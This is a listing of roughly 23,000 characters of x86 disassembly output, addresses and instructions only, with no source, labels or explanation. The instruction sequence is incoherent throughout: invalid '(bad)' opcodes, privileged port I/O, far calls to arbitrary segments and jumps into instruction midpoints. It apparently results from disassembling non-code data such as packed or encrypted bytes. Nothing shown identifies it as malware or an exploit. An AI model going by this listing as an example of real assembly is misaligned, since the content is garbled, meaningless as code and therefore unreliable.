  4185d2:	add    eax,0x8c20cbeb
  4185d7:	out    dx,eax
  4185d8:	pop    ebp
  4185d9:	xchg   ecx,eax
  4185da:	pop    ebp
  4185db:	lods   al,BYTE PTR ds:[esi]
  4185dc:	push   edx
  4185dd:	out    0xd7,eax
  4185df:	jne    0x4185e1
  4185e1:	sbb    DWORD PTR [ecx+edx*4-0x39c09b45],ecx
  4185e8:	daa    
  4185e9:	or     eax,0x42b72724
  4185ee:	inc    esp
  4185ef:	add    dh,BYTE PTR [edx+0xf4b1f14]
  4185f5:	jg     0x4185f2
  4185f7:	stos   BYTE PTR es:[edi],al
  4185f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f9:	nop
  4185fa:	jmp    0x41864a
  4185fc:	cmp    eax,0xf4f45920
  418601:	dec    ebx
  418602:	jl     0x418657
  418604:	xchg   esi,eax
  418605:	fmul   QWORD PTR [edx]
  418607:	icebp  
  418608:	cs xor al,0x44
  41860b:	push   0x6a
  41860d:	pop    edi
  41860e:	stos   BYTE PTR es:[edi],al
  41860f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418610:	pop    edx
  418611:	mov    esp,0x64fae0d4
  418616:	ss mov dl,0x6
  418619:	(bad)  
  41861a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861b:	mov    ch,0x78
  41861d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861e:	in     al,0x3b
  418620:	hlt    
  418621:	ins    BYTE PTR es:[edi],dx
  418622:	adc    edi,DWORD PTR [ecx-0x27]
  418625:	mov    cl,0xe1
  418627:	and    DWORD PTR [edx],edi
  418629:	sahf   
  41862a:	jnp    0x418640
  41862c:	jmp    0x6003:0xefd38ad7
  418633:	(bad)  
  418634:	enter  0x50e6,0xd0
  418638:	test   edi,edi
  41863a:	push   eax
  41863b:	and    DWORD PTR [eax-0x7ed202b5],ebp
  418641:	daa    
  418642:	xor    BYTE PTR [edx-0x2e828a71],0x8d
  418649:	inc    edi
  41864a:	aad    0xad
  41864c:	lock cmp al,0xb2
  41864f:	lock mov ch,0xf1
  418652:	add    bl,ah
  418654:	je     0x418659
  418656:	or     ebp,DWORD PTR [esp+esi*1-0x102a00b2]
  41865d:	add    BYTE PTR [ecx],dl
  41865f:	adc    DWORD PTR [edx-0x4d],edx
  418662:	ins    DWORD PTR es:[edi],dx
  418663:	adc    al,BYTE PTR [edx]
  418665:	xchg   ebx,eax
  418666:	mov    eax,0x940140a8
  41866b:	jecxz  0x4186a9
  41866d:	aad    0xe7
  41866f:	add    eax,0xfaf14087
  418674:	push   ebp
  418675:	cmp    eax,0x97efb387
  41867a:	adc    edx,DWORD PTR [edx+0x766ce782]
  418680:	les    ecx,FWORD PTR ds:0x28a229a
  418686:	jl     0x41867b
  418688:	add    eax,0x67b52265
  41868d:	jns    0x418707
  41868f:	mov    edx,0x4ae1b375
  418694:	fiadd  WORD PTR [eax-0x166ffbe8]
  41869a:	pop    esi
  41869b:	sbb    BYTE PTR [esi],dl
  41869d:	and    DWORD PTR [edi-0x7d],edi
  4186a0:	mov    edi,0xe7bca831
  4186a5:	nop
  4186a6:	cli    
  4186a7:	imul   esp,DWORD PTR [edi],0x1158e8e2
  4186ad:	je     0x41862f
  4186af:	outs   dx,DWORD PTR ds:[esi]
  4186b0:	fimul  DWORD PTR [edx+0x51d1a85b]
  4186b6:	push   edx
  4186b7:	mov    DWORD PTR [ecx-0x442db410],ecx
  4186bd:	dec    esi
  4186be:	test   eax,0xc7a58bf3
  4186c3:	add    dh,BYTE PTR [ebx+0x60]
  4186c6:	jb     0x4186ee
  4186c8:	std    
  4186c9:	xchg   edi,eax
  4186ca:	arpl   ax,di
  4186cc:	mov    bl,0x48
  4186ce:	aad    0x15
  4186d0:	mov    dl,0xe7
  4186d2:	stos   BYTE PTR es:[edi],al
  4186d3:	pop    es
  4186d4:	add    DWORD PTR [ecx-0x7d],ebx
  4186d7:	pop    edi
  4186d8:	test   BYTE PTR [edx-0x6c],bl
  4186db:	cli    
  4186dc:	test   al,0x77
  4186de:	mov    bl,BYTE PTR [ebx-0x5c]
  4186e1:	xchg   BYTE PTR [eax],dl
  4186e3:	jmp    DWORD PTR [edi]
  4186e5:	add    eax,0x3dc73fc8
  4186ea:	dec    esi
  4186eb:	cdq    
  4186ec:	mov    WORD PTR [eax],ds
  4186ee:	bound  ecx,QWORD PTR [edx]
  4186f0:	loope  0x4186ff
  4186f2:	mul    BYTE PTR [esi+0x4e]
  4186f5:	fsubr  st(3),st
  4186f7:	pop    eax
  4186f8:	mov    ebp,0xe67dc89
  4186fd:	ds cli 
  4186ff:	and    BYTE PTR [ebx+0x7c],ah
  418702:	and    eax,0x1036e70c
  418707:	inc    ebp
  418708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418709:	cmp    cl,BYTE PTR [ebx]
  41870b:	dec    esi
  41870c:	xor    al,0x45
  41870e:	mov    dl,0xf1
  418710:	outs   dx,BYTE PTR ds:[esi]
  418711:	push   ebx
  418712:	cmp    ebp,DWORD PTR [edx-0x8]
  418715:	mov    ebp,0xe6ecd1ff
  41871a:	call   0xfb77:0x566bf264
  418721:	mov    esp,0x47603353
  418726:	pop    ebp
  418727:	mov    ds:0xcb10a9c,al
  41872c:	add    BYTE PTR [ebp+0x4e],bl
  41872f:	adc    eax,0xd6ee627f
  418734:	xor    BYTE PTR [edi],al
  418736:	jno    0x41879a
  418738:	pop    edi
  418739:	data16 and BYTE PTR [eax+0x277a92ce],bl
  418740:	int3   
  418741:	aam    0x75
  418743:	dec    esp
  418744:	mov    al,0x92
  418746:	sar    DWORD PTR [edi],0x79
  418749:	das    
  41874a:	call   0x19f5:0xd96d3d70
  418751:	mov    ah,0x1d
  418753:	ficom  DWORD PTR [ecx-0x70]
  418756:	sub    esp,DWORD PTR [eax+0x3d]
  418759:	ss mov cl,0x49
  41875c:	pop    es
  41875d:	out    0xb3,eax
  41875f:	mov    ebx,DWORD PTR [ebp+esi*1-0x2e582b41]
  418766:	jecxz  0x41876a
  418768:	das    
  418769:	lods   eax,DWORD PTR ds:[esi]
  41876a:	in     al,dx
  41876b:	cmp    BYTE PTR [edi+0x15],ah
  41876e:	into   
  41876f:	pop    esi
  418770:	(bad)  
  418771:	in     eax,0x0
  418773:	int3   
  418774:	aas    
  418775:	cmp    eax,0xdb9b4f96
  41877a:	call   0xac86:0xcfba423e
  418781:	jbe    0x4187db
  418783:	(bad)  
  418784:	ret    0xa1ff
  418787:	xchg   esp,eax
  418788:	and    edi,esp
  41878a:	and    ebx,DWORD PTR [ecx]
  41878c:	push   ss
  41878d:	mov    ebp,0x71773136
  418792:	aas    
  418793:	mov    dh,0xae
  418796:	jmp    0xb0ac0ab8
  41879b:	pop    ebx
  41879c:	push   ds
  41879d:	xchg   esp,ebp
  41879f:	imul   BYTE PTR [edx-0x27]
  4187a2:	inc    ebx
  4187a3:	push   ebp
  4187a4:	js     0x4187a4
  4187a6:	cmp    BYTE PTR [edi-0x7b6c28de],bl
  4187ac:	push   ss
  4187ad:	push   edx
  4187ae:	xor    al,0x33
  4187b0:	xchg   DWORD PTR [esi+0x52],ecx
  4187b3:	in     eax,dx
  4187b4:	mov    BYTE PTR [ecx],al
  4187b6:	imul   esi,DWORD PTR [esi+0x40622f32],0x24ace46b
  4187c0:	outs   dx,BYTE PTR ds:[esi]
  4187c1:	xrelease mov BYTE PTR ds:0xd7dc71a5,al
  4187c8:	sbb    eax,0xcf7e0688
  4187cd:	daa    
  4187ce:	imul   esi,DWORD PTR [ebx+edi*2-0x3fdca65c],0xffffffdf
  4187d6:	dec    eax
  4187d7:	loopne 0x4187e5
  4187d9:	push   ds
  4187da:	arpl   dx,di
  4187dc:	imul   esi,DWORD PTR [ebx+ebp*1],0x91b56edf
  4187e3:	outs   dx,DWORD PTR ds:[esi]
  4187e4:	sub    eax,DWORD PTR [ebp+0x37612a7a]
  4187ea:	pop    ebx
  4187eb:	clc    
  4187ec:	(bad)  
  4187ee:	pushf  
  4187ef:	mul    DWORD PTR [ebx]
  4187f1:	pop    esi
  4187f2:	sub    al,0x46
  4187f4:	data16 test BYTE PTR [ebp-0x39],al
  4187f8:	push   eax
  4187f9:	(bad)  
  4187fa:	pusha  
  4187fb:	pop    edx
  4187fc:	mov    eax,ds:0x13b94b8d
  418801:	sbb    al,0x29
  418803:	sbb    eax,0x8485147a
  418808:	pop    ds
  418809:	jg     0x41885a
  41880b:	sbb    al,0xa7
  41880d:	inc    eax
  41880e:	scas   al,BYTE PTR es:[edi]
  41880f:	dec    ecx
  418810:	aas    
  418811:	add    eax,0xe22f566b
  418816:	inc    edi
  418817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418818:	lea    ebx,[ecx]
  41881a:	out    dx,eax
  41881b:	dec    esi
  41881c:	outs   dx,BYTE PTR ds:[esi]
  41881d:	sub    al,0x3b
  41881f:	sbb    DWORD PTR [edi-0x4a],esp
  418822:	jle    0x418861
  418824:	sbb    dh,BYTE PTR [ebp-0x52]
  418827:	lahf   
  418828:	or     ebx,DWORD PTR [edi+ebp*1]
  41882b:	pop    ebx
  41882c:	cs xchg ebp,eax
  41882e:	mov    dh,0x2c
  418830:	and    BYTE PTR [ecx-0x4df2d18b],dh
  418836:	jbe    0x41885d
  418838:	repz imul edi,DWORD PTR ds:0x222576fc,0xa3c0bb73
  418843:	ficomp WORD PTR [edx+0x96716a]
  418849:	scas   al,BYTE PTR es:[edi]
  41884a:	inc    esp
  41884b:	pop    ss
  41884c:	daa    
  41884d:	push   ecx
  41884e:	fistp  WORD PTR [ebp-0x69155d0]
  418854:	xchg   ebx,eax
  418855:	iret   
  418856:	jnp    0x418841
  418858:	and    BYTE PTR [eax],bl
  41885a:	les    edi,FWORD PTR [esi]
  41885c:	femms  
  41885e:	xlat   BYTE PTR ds:[ebx]
  41885f:	sbb    eax,0x4c2c7ea6
  418864:	je     0x418814
  418866:	pop    ss
  418867:	mov    edi,0x199e5a8d
  41886c:	dec    esi
  41886d:	daa    
  41886e:	out    dx,eax
  41886f:	sbb    DWORD PTR [esi-0x3d1da16b],esi
  418875:	mov    esp,0xda437a48
  41887a:	sbb    DWORD PTR [ebx+0x50fd51e5],ebp
  418880:	test   al,ch
  418882:	xor    DWORD PTR ds:0x4a86cc81,esi
  418888:	jle    0x4188a8
  41888a:	mov    DWORD PTR [edi],esp
  41888c:	and    ecx,esi
  41888e:	mov    cl,0xb3
  418890:	add    al,BYTE PTR [ebp-0x59]
  418893:	retf   0xa7ec
  418896:	jl     0x4188b5
  418898:	call   0xfefc:0xfae6d645
  41889f:	inc    ebx
  4188a0:	shl    BYTE PTR [edx+edx*2-0x3c],cl
  4188a4:	push   0x668571b7
  4188a9:	xor    ebp,DWORD PTR [eax-0xf]
  4188ac:	adc    cl,bh
  4188ae:	repz data16 xor al,0x1e
  4188b2:	icebp  
  4188b3:	sub    eax,0x583a954a
  4188b8:	cld    
  4188b9:	mov    edx,0x19feac9e
  4188be:	push   ebx
  4188bf:	push   cs
  4188c0:	int    0x51
  4188c2:	mov    bl,0x31
  4188c4:	retf   
  4188c5:	call   0x2ee1:0x8b235c
  4188cc:	iret   
  4188cd:	xlat   BYTE PTR ds:[ebx]
  4188ce:	xchg   DWORD PTR [eax+ebx*4+0x2e],ebx
  4188d2:	inc    esp
  4188d3:	rol    BYTE PTR [edx],1
  4188d5:	das    
  4188d6:	(bad)  
  4188d7:	or     BYTE PTR [ebp+0x64],0x11
  4188db:	sahf   
  4188dc:	loope  0x4188a7
  4188de:	and    al,0xbb
  4188e0:	sbb    al,BYTE PTR [edx]
  4188e2:	dec    esi
  4188e3:	mov    ebp,ebp
  4188e5:	imul   edi,ebp,0xffffffd4
  4188e8:	or     dl,BYTE PTR fs:[esi]
  4188eb:	and    ebx,DWORD PTR [ecx]
  4188ed:	mov    esi,0x75b00c11
  4188f2:	loopne 0x418922
  4188f4:	dec    esi
  4188f5:	push   ebp
  4188f6:	xlat   BYTE PTR ds:[ebx]
  4188f7:	cmp    BYTE PTR [esi+0x61],0x33
  4188fb:	(bad)  
  4188fc:	and    ecx,ebp
  4188fe:	loopne 0x418947
  418900:	lea    esp,ds:0x93c0fac8
  418906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418907:	sub    al,0x94
  418909:	mov    edx,0x8df533d0
  41890e:	nop
  41890f:	or     eax,0xe2e519d9
  418914:	mov    bh,0x6b
  418916:	and    BYTE PTR [ebp+0x6a],bl
  418919:	data16 and BYTE PTR [ebp-0x3a],dh
  41891d:	in     eax,0x90
  41891f:	loope  0x4188c1
  418921:	pop    esp
  418922:	cmp    BYTE PTR [eax],0x13
  418925:	jne    0x418998
  418927:	pop    edi
  418928:	or     al,0x61
  41892a:	xor    eax,0xa776839b
  41892f:	rcl    BYTE PTR [edx+0x4c3055df],1
  418935:	cli    
  418936:	xchg   edi,eax
  418937:	pushf  
  418938:	mov    cl,BYTE PTR [ebx+0x79fbfaf5]
  41893e:	js     0x4189b4
  418940:	rcl    edx,cl
  418942:	aaa    
  418943:	or     dl,BYTE PTR [eax]
  418945:	ds and al,0x7f
  418948:	cmovp  ecx,eax
  41894b:	mov    bl,0x29
  41894d:	cdq    
  41894e:	push   esp
  41894f:	hlt    
  418950:	call   0x933c:0x44b68b5f
  418957:	repnz mov cl,0xc2
  41895a:	jb     0x418923
  41895c:	or     ah,dl
  41895e:	pop    eax
  41895f:	stos   BYTE PTR es:[edi],al
  418960:	fmul   QWORD PTR [edi-0x1b]
  418963:	jmp    0x4189ce
  418965:	rcl    edx,0x4f
  418968:	in     al,dx
  418969:	(bad)  
  41896a:	mov    edi,0xc280f3f5
  41896f:	pop    edx
  418970:	adc    eax,0xa3f2b716
  418975:	(bad)  
  418976:	shl    DWORD PTR [ebp+eax*4+0x43],1
  41897a:	add    edx,DWORD PTR [eax+0x20]
  41897d:	mov    ah,0x7a
  41897f:	dec    esi
  418980:	dec    ecx
  418981:	cmp    BYTE PTR [ecx-0x62],0x90
  418985:	pop    ecx
  418986:	xchg   ebx,eax
  418987:	pop    es
  418988:	push   ecx
  418989:	xchg   esp,eax
  41898a:	sti    
  41898b:	not    esi
  41898d:	dec    esi
  41898e:	mov    esp,0xe000350f
  418993:	int3   
  418994:	imul   eax,esi,0x3
  418997:	shr    DWORD PTR [ebp-0x1a95b58a],1
  41899d:	pop    ds
  41899e:	hlt    
  41899f:	sbb    esp,DWORD PTR [ebx+ebp*4+0x15]
  4189a3:	lock (bad) 
  4189a5:	xchg   ebp,eax
  4189a6:	mov    ebx,0x958399dd
  4189ab:	leave  
  4189ac:	jne    0x418a0f
  4189ae:	ret    0x5c94
  4189b1:	sub    DWORD PTR ds:0x7cb86149,edi
  4189b7:	aad    0x72
  4189b9:	sbb    al,0xd7
  4189bb:	shr    DWORD PTR ds:0x1eecd3ae,cl
  4189c1:	push   ss
  4189c2:	scas   eax,DWORD PTR es:[edi]
  4189c3:	nop
  4189c4:	into   
  4189c5:	add    ecx,edi
  4189c7:	(bad)  
  4189c8:	pop    ds
  4189c9:	jecxz  0x418a33
  4189cb:	or     ch,al
  4189cd:	out    0x61,al
  4189cf:	outs   dx,BYTE PTR ds:[esi]
  4189d0:	mov    ecx,0x690ed60
  4189d5:	fs xor eax,0xdc55ac07
  4189db:	retf   0xc77
  4189de:	rcr    BYTE PTR [edx+ebp*8-0x77],1
  4189e2:	ror    BYTE PTR [ebx+eax*2-0x72],1
  4189e6:	dec    ecx
  4189e7:	sub    ebx,ebp
  4189e9:	ins    BYTE PTR es:[edi],dx
  4189ea:	xchg   DWORD PTR [ebx-0x25],edx
  4189ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ee:	es ins DWORD PTR es:[edi],dx
  4189f0:	int    0xbb
  4189f2:	adc    eax,ecx
  4189f4:	xchg   esi,eax
  4189f5:	pop    eax
  4189f6:	bound  edi,QWORD PTR [edi+0x6c215dc2]
  4189fc:	dec    ecx
  4189fd:	(bad)  [ecx-0x12]
  418a00:	cmc    
  418a01:	aas    
  418a02:	leave  
  418a03:	or     ebx,DWORD PTR [ebp+0x33]
  418a06:	jp     0x418a4e
  418a08:	shl    esi,cl
  418a0a:	mov    ebx,0xcf6e9f8d
  418a0f:	retf   0x6188
  418a12:	(bad)  
  418a13:	push   edi
  418a14:	jae    0x418a54
  418a16:	sub    esp,DWORD PTR [ebx-0x39]
  418a19:	scas   eax,DWORD PTR es:[edi]
  418a1a:	iret   
  418a1b:	stc    
  418a1c:	arpl   WORD PTR [edi-0x4a],si
  418a1f:	or     cl,BYTE PTR [ebp+0x63]
  418a22:	xor    DWORD PTR [edi+edx*4-0x5a312526],ebx
  418a29:	xchg   BYTE PTR [eax],bl
  418a2b:	and    al,0xb4
  418a2d:	adc    dh,BYTE PTR [edx+ebx*2-0x2d44493a]
  418a34:	imul   edi,DWORD PTR [ecx+0x46],0xffffffad
  418a38:	add    edx,DWORD PTR [eax]
  418a3a:	mov    ds:0x623fd8ab,eax
  418a3f:	xchg   esi,edx
  418a41:	mov    ebp,0x532a52ad
  418a46:	inc    edi
  418a47:	dec    ebp
  418a48:	or     esp,DWORD PTR [esi-0x4f]
  418a4b:	loope  0x418a16
  418a4d:	sub    edx,DWORD PTR [esi+0xb]
  418a50:	clc    
  418a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a52:	mov    al,0xb9
  418a54:	add    esp,DWORD PTR [ebx+0x7b]
  418a57:	bound  esi,QWORD PTR [ebp-0x287c902d]
  418a5d:	xlat   BYTE PTR ds:[ebx]
  418a5e:	jge    0x4189e7
  418a60:	sub    dl,BYTE PTR [edx]
  418a62:	jl     0x418ae3
  418a64:	mov    dl,0x61
  418a66:	pushf  
  418a67:	cs xchg ecx,eax
  418a69:	test   eax,0x5de247b
  418a6e:	mov    BYTE PTR [ecx],bl
  418a70:	adc    eax,0xf29ec49
  418a75:	pop    ebp
  418a76:	pop    es
  418a77:	adc    DWORD PTR [eax],ebp
  418a79:	test   eax,0x5483da74
  418a7e:	add    al,0x84
  418a80:	xchg   ecx,eax
  418a81:	cdq    
  418a82:	dec    eax
  418a83:	pushf  
  418a84:	adc    ebp,DWORD PTR [esi+0x8]
  418a87:	leave  
  418a88:	and    BYTE PTR [ebx],ah
  418a8a:	dec    ecx
  418a8b:	xor    edx,esi
  418a8d:	(bad)  
  418a8e:	push   esi
  418a8f:	out    0x4f,eax
  418a91:	xchg   ebx,eax
  418a92:	cli    
  418a93:	mov    ds:0xbd7d4a3,al
  418a98:	loop   0x418a1f
  418a9a:	pop    ss
  418a9b:	sbb    DWORD PTR [ebx+0x65abf821],esi
  418aa1:	inc    esp
  418aa2:	shl    DWORD PTR [esi+0x90f15a8],0x4d
  418aa9:	je     0x418a6d
  418aab:	fmulp  st(5),st
  418aad:	inc    edi
  418aae:	jo     0x418a58
  418ab0:	sbb    dh,ch
  418ab2:	ja     0x418afa
  418ab4:	nop
  418ab5:	sbb    edi,DWORD PTR ds:0xe00fe46a
  418abb:	imul   ebp,DWORD PTR [edi+ebp*2-0x19],0x30fc1f2e
  418ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ac4:	pop    ebx
  418ac5:	lahf   
  418ac6:	jmp    0x5028:0x377fc49
  418acd:	pop    ecx
  418ace:	sbb    eax,0x58dc7727
  418ad3:	cmp    DWORD PTR [ebp+0x3885ae0f],0x91bda14f
  418add:	xor    ebp,DWORD PTR [ecx+eiz*2+0x3a1ece12]
  418ae4:	ss xor ch,bh
  418ae7:	or     esp,esp
  418ae9:	(bad)  
  418aea:	jns    0x418b27
  418aec:	inc    edx
  418aed:	adc    al,BYTE PTR [edi]
  418aef:	cmp    DWORD PTR [edi],ebp
  418af1:	push   eax
  418af2:	cmc    
  418af3:	es pop esi
  418af5:	clc    
  418af6:	mov    edi,0xeeedf795
  418afb:	cmp    BYTE PTR [edx-0x73],dl
  418afe:	xchg   BYTE PTR [ecx-0x79],bl
  418b01:	ds call 0x1752c7ef
  418b07:	jbe    0x418a9b
  418b09:	mov    dl,BYTE PTR [edi+0xaa068d]
  418b0f:	cmp    DWORD PTR [esi-0x479a8a1d],ecx
  418b15:	inc    ecx
  418b16:	enter  0xf10c,0x89
  418b1a:	inc    esi
  418b1b:	sbb    edx,DWORD PTR [edx]
  418b1d:	bound  ebp,QWORD PTR [edx-0x1ae1dd1e]
  418b23:	mov    edx,0x1f2c155d
  418b28:	mov    ecx,0x9820f37a
  418b2d:	or     BYTE PTR [ebp+0x75],0xae
  418b31:	or     DWORD PTR ds:[eax],ebp
  418b34:	sub    ebp,eax
  418b36:	(bad)  
  418b37:	lds    edi,FWORD PTR [edx+0x3351f3b0]
  418b3d:	mov    cl,0xa6
  418b3f:	jecxz  0x418b20
  418b41:	inc    BYTE PTR ds:[ebx]
  418b44:	mov    es,WORD PTR [edx+esi*2+0x2]
  418b48:	sub    eax,esp
  418b4a:	iret   
  418b4b:	ffree  st(1)
  418b4d:	ds dec esp
  418b4f:	imul   ecx,DWORD PTR [eax-0x4d0e0e6e],0xe9f38312
  418b59:	xchg   edx,eax
  418b5a:	add    ebp,DWORD PTR [edi-0x10795d0f]
  418b60:	xor    BYTE PTR [esi-0x7c],al
  418b63:	fisttp WORD PTR [esi+ebp*8]
  418b66:	fidiv  WORD PTR [esi-0x5e6d844c]
  418b6c:	dec    ebx
  418b6d:	xchg   ebx,eax
  418b6e:	out    0xf6,al
  418b70:	sbb    al,0xee
  418b72:	les    eax,FWORD PTR [ecx]
  418b74:	pop    ss
  418b75:	push   esi
  418b76:	icebp  
  418b77:	pop    edx
  418b78:	push   esp
  418b79:	pop    ds
  418b7a:	jbe    0x418b4c
  418b7c:	loopne 0x418b93
  418b7e:	scas   eax,DWORD PTR es:[edi]
  418b7f:	xchg   edx,eax
  418b80:	inc    ecx
  418b81:	mov    ah,bh
  418b83:	ins    BYTE PTR es:[edi],dx
  418b84:	jno    0x418b6c
  418b86:	dec    ebp
  418b87:	(bad)  
  418b88:	and    eax,0xae1bb2c7
  418b8d:	sub    al,0x28
  418b8f:	test   al,0xef
  418b91:	sub    dl,BYTE PTR [eax]
  418b93:	jmp    DWORD PTR [ebp-0x1aa7319e]
  418b99:	mov    bl,0x8a
  418b9b:	and    eax,DWORD PTR [eax]
  418b9d:	fistp  QWORD PTR [ebx]
  418b9f:	inc    ebx
  418ba0:	pusha  
  418ba1:	lds    esp,FWORD PTR [edx-0x4755de3f]
  418ba7:	mov    bh,0xaf
  418ba9:	sbb    DWORD PTR [edi],ebp
  418bab:	xchg   edi,eax
  418bac:	mov    al,ds:0x87557d80
  418bb1:	repz or esi,esi
  418bb4:	ins    DWORD PTR es:[edi],dx
  418bb5:	cwde   
  418bb6:	leave  
  418bb7:	imul   esp,DWORD PTR [ebx],0x72323c68
  418bbd:	mov    ah,0xa1
  418bbf:	xchg   edx,eax
  418bc0:	mov    bh,0xdd
  418bc2:	jb     0x418b5b
  418bc4:	int    0x89
  418bc6:	sbb    DWORD PTR [edi],ecx
  418bc8:	lock bndstx [eax+edi*2],(bad)
  418bcd:	and    DWORD PTR [edx],edi
  418bcf:	push   ebx
  418bd0:	and    ch,BYTE PTR [esi]
  418bd2:	test   eax,0x34531e48
  418bd7:	pop    ebx
  418bd8:	mov    DWORD PTR [eax],edx
  418bda:	push   ebx
  418bdb:	outs   dx,DWORD PTR ds:[esi]
  418bdc:	cdq    
  418bdd:	in     eax,dx
  418bde:	mov    ds:0xbcc46cec,al
  418be3:	push   0xffffff8c
  418be5:	iret   
  418be6:	and    ecx,esp
  418be8:	pop    ebp
  418be9:	mov    WORD PTR [edx+0x28c876af],fs
  418bef:	je     0x418b72
  418bf1:	mov    gs,WORD PTR [ecx]
  418bf3:	pop    ebp
  418bf4:	test   eax,0x1d1bb865
  418bf9:	int3   
  418bfa:	inc    ecx
  418bfb:	xor    ebp,esi
  418bfd:	inc    eax
  418bfe:	(bad)  
  418bff:	test   BYTE PTR [eax-0x31d61537],0x91
  418c06:	iret   
  418c07:	inc    edi
  418c08:	sbb    ebx,ecx
  418c0a:	add    al,0xa5
  418c0c:	js     0x418c00
  418c0e:	test   DWORD PTR [ecx-0x6f],ebp
  418c11:	hlt    
  418c12:	aad    0x9a
  418c14:	jae    0x418c8b
  418c16:	inc    esi
  418c17:	mov    bh,0x3b
  418c19:	inc    ebx
  418c1a:	dec    eax
  418c1b:	xor    cl,dl
  418c1d:	(bad)  
  418c1e:	out    dx,al
  418c1f:	fwait
  418c20:	dec    esp
  418c21:	inc    ebp
  418c22:	inc    esp
  418c23:	sbb    bl,bl
  418c25:	out    0xb9,eax
  418c27:	es aaa 
  418c29:	bound  eax,QWORD PTR [ebx]
  418c2b:	xor    DWORD PTR ds:0x4757dcd4,edi
  418c31:	std    
  418c32:	dec    ecx
  418c33:	jl     0x418c94
  418c35:	lock faddp st(3),st
  418c38:	hlt    
  418c39:	mov    edi,0x66fa39d8
  418c3e:	cdq    
  418c3f:	lods   al,BYTE PTR ds:[esi]
  418c40:	int    0x9d
  418c42:	adc    DWORD PTR [edx+0x7a0b4e8],ecx
  418c48:	add    DWORD PTR [edx+0x61],ebp
  418c4b:	pop    ebx
  418c4c:	pop    eax
  418c4d:	push   edi
  418c4e:	adc    al,0x6b
  418c50:	xor    dh,0x67
  418c53:	cwde   
  418c54:	push   0xffffffe4
  418c56:	jo     0x418c52
  418c58:	cmp    eax,0xc4c9303c
  418c5d:	adc    BYTE PTR [esi],ah
  418c5f:	dec    edx
  418c60:	lock mov ch,0x90
  418c63:	cdq    
  418c64:	inc    ecx
  418c65:	xchg   edi,eax
  418c66:	test   DWORD PTR [ecx+esi*1],0xdd284093
  418c6d:	fadd   DWORD PTR [eax+eax*8+0x4dc52310]
  418c74:	xchg   edx,eax
  418c75:	aad    0xef
  418c77:	pop    es
  418c78:	mov    BYTE PTR [eax],ch
  418c7a:	cmp    BYTE PTR [ebx],0x34
  418c7d:	ret    0xa08d
  418c80:	rcl    BYTE PTR [ebx+eax*2+0x13],cl
  418c84:	or     bl,al
  418c86:	cmc    
  418c87:	sar    cl,0x2e
  418c8a:	mov    esi,esp
  418c8c:	ja     0x418c7e
  418c8e:	mov    ch,0x8b
  418c90:	clc    
  418c91:	mov    eax,0x2c6f2bb
  418c96:	and    BYTE PTR [edi],0xca
  418c99:	jbe    0x418caf
  418c9b:	fcmovnb st,st(1)
  418c9d:	bound  ecx,QWORD PTR [eax]
  418c9f:	inc    esp
  418ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca1:	cmp    BYTE PTR [eax],ch
  418ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ca4:	ins    DWORD PTR es:[edi],dx
  418ca5:	(bad)  
  418ca6:	ins    BYTE PTR es:[edi],dx
  418ca7:	inc    esp
  418ca8:	clc    
  418ca9:	inc    ebx
  418caa:	push   ds
  418cab:	ins    BYTE PTR es:[edi],dx
  418cac:	xchg   ebx,eax
  418cad:	(bad)  
  418cae:	rol    BYTE PTR [edx],1
  418cb0:	callw  0x74ca
  418cb4:	lods   al,BYTE PTR ds:[esi]
  418cb5:	out    dx,eax
  418cb6:	cmp    dh,BYTE PTR [eax+0x59]
  418cb9:	adc    dh,cl
  418cbb:	fisub  WORD PTR [eax-0x4a4e5e99]
  418cc1:	fwait
  418cc2:	daa    
  418cc3:	lds    ebx,FWORD PTR [ebx]
  418cc5:	std    
  418cc6:	sub    al,0x6
  418cc8:	pushf  
  418cc9:	pop    es
  418cca:	outs   dx,DWORD PTR ds:[esi]
  418ccb:	xchg   esp,eax
  418ccc:	sub    eax,0x7a8a867a
  418cd1:	add    al,0x8d
  418cd3:	ret    
  418cd4:	pop    esi
  418cd5:	or     bl,BYTE PTR [ebp+0x5c]
  418cd8:	inc    ecx
  418cd9:	dec    esi
  418cda:	inc    edx
  418cdb:	and    dh,BYTE PTR [eax-0x71]
  418cde:	inc    edx
  418cdf:	ss push ecx
  418ce1:	not    BYTE PTR [edi-0xd]
  418ce4:	pusha  
  418ce5:	in     eax,0xbd
  418ce7:	aam    0x2d
  418ce9:	inc    ebp
  418cea:	jmp    0x5710356c
  418cef:	mov    ebp,0x8bba0b9c
  418cf4:	lock fisubr DWORD PTR [ecx]
  418cf7:	in     eax,0xd3
  418cf9:	pminsw mm0,QWORD PTR [ebx+ecx*8+0x65dfc5db]
  418d01:	enter  0xd21e,0xac
  418d05:	cli    
  418d06:	pop    ebp
  418d07:	mov    bh,0xcd
  418d09:	mov    esi,esp
  418d0b:	out    0x8a,al
  418d0d:	shr    BYTE PTR [ebp+0x18],0xd7
  418d11:	mov    ebp,0x67322dff
  418d16:	cld    
  418d17:	sbb    eax,0x593772c5
  418d1c:	into   
  418d1d:	inc    ebx
  418d1e:	xchg   esi,eax
  418d1f:	sbb    esi,ebp
  418d21:	sub    eax,0x3c7063b3
  418d26:	aas    
  418d27:	push   ebx
  418d28:	mov    esp,0x4e7be20
  418d2d:	mov    WORD PTR [ecx-0x4c9fe0a4],?
  418d33:	sbb    al,BYTE PTR [ebx-0x3ab60dec]
  418d39:	inc    ebx
  418d3a:	test   ebp,ecx
  418d3c:	push   edx
  418d3d:	ret    0x2542
  418d40:	(bad)  
  418d41:	cmp    eax,eax
  418d43:	cmc    
  418d44:	dec    esp
  418d45:	dec    ebp
  418d46:	push   ecx
  418d47:	lea    edi,[ebx+0x26fb3aa3]
  418d4d:	jbe    0x418d79
  418d4f:	push   cs
  418d50:	mov    esp,0xab8e72e5
  418d55:	sbb    BYTE PTR [eax],dh
  418d57:	rcl    DWORD PTR [eax-0x2f],0x74
  418d5b:	xchg   ebx,eax
